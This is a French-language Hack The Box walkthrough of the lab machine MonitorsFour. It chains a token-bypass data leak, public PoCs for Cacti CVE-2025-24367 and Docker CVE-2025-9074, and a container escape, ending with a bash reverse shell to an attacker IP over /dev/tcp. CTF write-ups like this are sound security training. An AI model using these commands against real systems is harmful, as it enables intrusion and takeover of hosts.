---
date: 2026-05-20T06:30:27-05:00
# description: ""
image: "/images/HTB-Eighteen/MonitorsFour.png"
showTableOfContents: true
tags: ["HackTheBox", "Labs", "Windows", "cacti", "CVE-2025-24367", "container-escape", "CVE-2025-9074", "docker", "docker-api"]
categories: ["Red Teaming"]
title: "HTB: MonitorsFour"
type: "post"
---

* Platforme: Hack The Box
* Lien: [MonitorsFour](https://app.hackthebox.com/machines/MonitorsFour)
* Niveau: Facile
* OS: Windows
---

MonitorsFour débute par l’énumération d’une application web et la découverte d’un endpoint vulnérable permettant la divulgation d’informations utilisateurs. Les identifiants récupérés donnent accès à l’interface principale ainsi qu’à une instance de Cacti utilisée pour la supervision réseau.

L’analyse de l’instance Cacti met en évidence la vulnérabilité `CVE-2025-24367`, permettant l’exécution de code à distance. Son exploitation conduit à l’obtention d’un accès initial au système au sein d’un conteneur Docker hébergé sur une machine Windows.

L'énumération de la cible permet ensuite d’identifier une API Docker exposée sans authentification. L’analyse de l’environnement Docker révèle la vulnérabilité `CVE-2025-9074`, permettant l’exécution de commandes privilégiées sur l’hôte via l’API Docker Engine. L’exploitation de cette faille conduit finalement à une évasion du conteneur et à la compromission complète du système Windows sous-jacent.

# Balayage

```
nmap -p- --open -T4 -sCV -oA nmap/MonitorsFour {TARGET_IP}
```

**Résultats**

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-20 07:57 EDT
Nmap scan report for 10.129.48.141
Host is up (0.11s latency).
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE VERSION
80/tcp   open  http    nginx
|_http-title: Did not follow redirect to http://monitorsfour.htb/

5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 177.01 seconds
```

Nmap détecte deux ports ouverts :
- 80 (HTTP) avec un serveur web Nginx, et une redirection vers `monitorsfour.htb`

```
sudo echo "{IP} monitorsfour.htb" | sudo tee -a /etc/hosts
```

- 5985, qui est le port par défaut pour WinRM

# Énumération

En se rendant sur `http://monitorsfour.htb/`, nous découvrons le site web d'une solution de surveillance de réseau.

![MonitorsFour website](/images/HTB-MonitorsFour/monitorsfour_web.png)

L'application web ne présente aucune vulnérabilité exploitable; nous passons donc à l'énumération des répertoires.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://monitorsfour.htb
```

![MonitorsFour website](/images/HTB-MonitorsFour/monitors4_gobuster.png)

Un répertoire nommé `/.env` est découvert. On y accède à l'adresse `http://monitorsfour.htb/.env`.

![MonitorsFour env](/images/HTB-MonitorsFour/monitors4_env.png)

Un fichier est téléchargé. Il contient les identifiants de la base de données, mais nous ne pouvons pas l'utiliser pour le moment. Nous passons ensuite à l'énumération des sous-domaines.

```
ffuf -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 100 -u http://monitorsfour.htb -H "Host: FUZZ.monitorsfour.htb" -ic -fs 138
```

![MonitorsFour subdomain enumeration](/images/HTB-MonitorsFour/monitors4_ffuf.png)

À l'adresse `http://cacti.monitorsfour.htb`, nous trouvons une instance de [cacti](https://www.cacti.net/) avec la version `1.2.28`.

![MonitorsFour cacti version](/images/HTB-MonitorsFour/cacti_version.png)

Des identifiants sont nécessaires pour se connecter ; nous retournons sur le site principal et examinons les autres points de terminaison. `/user` semble intéressant, mais toute tentative d'accès aboutit à une erreur en raison de l'absence du paramètre `token`.

![MonitorsFour user directory](/images/HTB-MonitorsFour/monitors4_user.png)

Nous testons la logique, et les valeurs aléatoires ainsi que les jetons vides échouent.

```
curl "http://monitorsfour.htb/user?token=AAAA"

curl "http://monitorsfour.htb/user?token="
```

![token tests](/images/HTB-MonitorsFour/token_tests.png)

En effectuant un fuzzing, on constate que `0` est une valeur valide pour `token`.

```
ffuf -u 'http://monitorsfour.htb/user?token=FUZZ' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac
```

![user endpoint fuzing](/images/HTB-MonitorsFour/user-fuzz.png)

L'envoi d'une requête valide renvoie les identifiants des utilisateurs.

```
curl "http://monitorsfour.htb/user?token=0
```

```json
[
  {
    "id": 2,
    "username": "admin",
    "email": "admin@monitorsfour.htb",
    "password": "56b32eb43e6f15395f6c46c1c9e1cd36",
    "role": "super user",
    "token": "8024b78f83f102da4f",
    "name": "Marcus Higgins",
    "position": "System Administrator",
    "dob": "1978-04-26",
    "start_date": "2021-01-12",
    "salary": "320800.00"
  },
  {
    "id": 5,
    "username": "mwatson",
    "email": "mwatson@monitorsfour.htb",
    "password": "69196959c16b26ef00b77d82cf6eb169",
    "role": "user",
    "token": "0e543210987654321",
    "name": "Michael Watson",
    "position": "Website Administrator",
    "dob": "1985-02-15",
    "start_date": "2021-05-11",
    "salary": "75000.00"
  },
  {
    "id": 6,
    "username": "janderson",
    "email": "janderson@monitorsfour.htb",
    "password": "2a22dcf99190c322d974c8df5ba3256b",
    "role": "user",
    "token": "0e999999999999999",
    "name": "Jennifer Anderson",
    "position": "Network Engineer",
    "dob": "1990-07-16",
    "start_date": "2021-06-20",
    "salary": "68000.00"
  },
  {
    "id": 7,
    "username": "dthompson",
    "email": "dthompson@monitorsfour.htb",
    "password": "8d4a7e7fd08555133e056d9aacb1e519",
    "role": "user",
    "token": "0e111111111111111",
    "name": "David Thompson",
    "position": "Database Manager",
    "dob": "1982-11-23",
    "start_date": "2022-09-15",
    "salary": "83000.00"
  }
]
```

Le mot de passe `wonderful1` est récupéré pour l'utilisateur `admin`.

![marcus password](/images/HTB-MonitorsFour/marcus_pwd.png)

En utilisant les identifiants `admin:wonderful1`, nous nous connectons au site web principal et accédons au tableau de bord.

![MonitorsFour dashboard](/images/HTB-MonitorsFour/monitorsfour_dashboard.png)

Ces identifiants ne fonctionnent pas sur l'instance Cacti, mais `marcus:wonderful1` sont acceptés.

![cacti login](/images/HTB-MonitorsFour/cacti_monitors4.png)

Nous accédons au tableau de bord.

![cacti dashboard](/images/HTB-MonitorsFour/cacti_dashboard.png)

# Accès Initial

En explorant le tableau de bord, rien d'exploitable n'apparaît. Une recherche sur les vulnérabilités de Cacti mène à `CVE-2025-24367`, pour laquelle un PoC est disponible [here](https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC).

**Préparation de l'environnement**

```
git clone https://github.com/TheCyberGeek/CVE-2025-24367-Cacti-PoC.git

cd CVE-2025-24367-Cacti-PoC

python3 -m venv myvenv

source myvenv/bin/activate
```

**Exploitation de la vulnérabilité**

```
sudo python3 exploit.py -url http://cacti.monitorsfour.htb -u marcus -p wonderful1 -i <ATTACKER_IP> -l <LISTERNER_PORT>
```

![CVE-2025-24367](/images/HTB-MonitorsFour/cacti_exploit.png)

![MonitorsFour foothold](/images/HTB-MonitorsFour/foothold.png)

Le nom d'hôte attire l'attention: il s'agit d'un identifiant de conteneur classique. La cible est une machine Windows, mais nous nous trouvons actuellement dans un conteneur Linux ; le drapeau utilisateur se trouve dans `/home/marcus`.

![user flag location](/images/HTB-MonitorsFour/MonitorsFour_userflag.png)

# Élévation des privilèges

Nous devons sortir du conteneur pour accéder au système hôte. Nous commençons par recueillir quelques informations réseau.

![network data](/images/HTB-MonitorsFour/network_data.png)

`172.18.0.1` correspond à la passerelle du pont Docker / l'interface Docker côté hôte, tandis que `192.168.65.7` désigne le serveur DNS en amont ou l'hôte externe accessible depuis Docker.

Une technique d'échappement courante consiste à exploiter l'API ; vérifions ce point.

```
curl http://192.168.65.7:2375/version
```

![Docker API version](/images/HTB-MonitorsFour/Docker_API_version.png)

L'analyse de la configuration réseau de Docker a révélé une API Docker Remote exposée, accessible à l'adresse `192.168.65.7:2375`. Une requête sur le point de terminaison `/version` a confirme l'accès sans authentification au daemon Docker. La réponse identifie l'environnement comme étant Docker Engine Community, fonctionnant sur un noyau Linux basé sur WSL2 (`6.6.87.2-microsoft-standard-WSL2`).

Nous énumérons les images Docker.

```
curl -s http://192.168.65.7:2375/images/json | grep -o '"RepoTags":\[[^]]*\]'
```

![Docker images enumeration](/images/HTB-MonitorsFour/docker_enum.png)

Trois images Docker sont disponibles sur l'hôte Docker. Après vérification, nous constatons que la `version 28.3.2` (obtenue en interrogeant `/version` ) correspond à Docker Desktop 4.43.x ou une version plus récente. En recherchant "Docker Desktop 4.43.x cve", nous trouvons `CVE-2025-9074`, une vulnérabilité permettant aux conteneurs locaux d'exécuter des commandes privilégiées sur l'hôte via l'API Docker Engine. 

Un PoC est disponible [ici](https://github.com/BridgerAlderson/CVE-2025-9074-PoC). La commande ci-dessous permet de créer un nouveau conteneur.  

```
./cve-2025-9074.sh 192.168.65.7 'bash -c "bash -i >& /dev/tcp/10.10.14.48/9001 0>&1"' 2375
```

![RCE cve_2025_9074](/images/HTB-MonitorsFour/rce_cve_2025_9074.png)

Un shell est créé sur le listener et nous pouvons lire le drapeau root à l'emplacement `/host_root/mnt/host/c/Users/Administrator/Desktop/root.txt`.

![Root flag location](/images/HTB-MonitorsFour/MonitorsFour_rootflag.png)


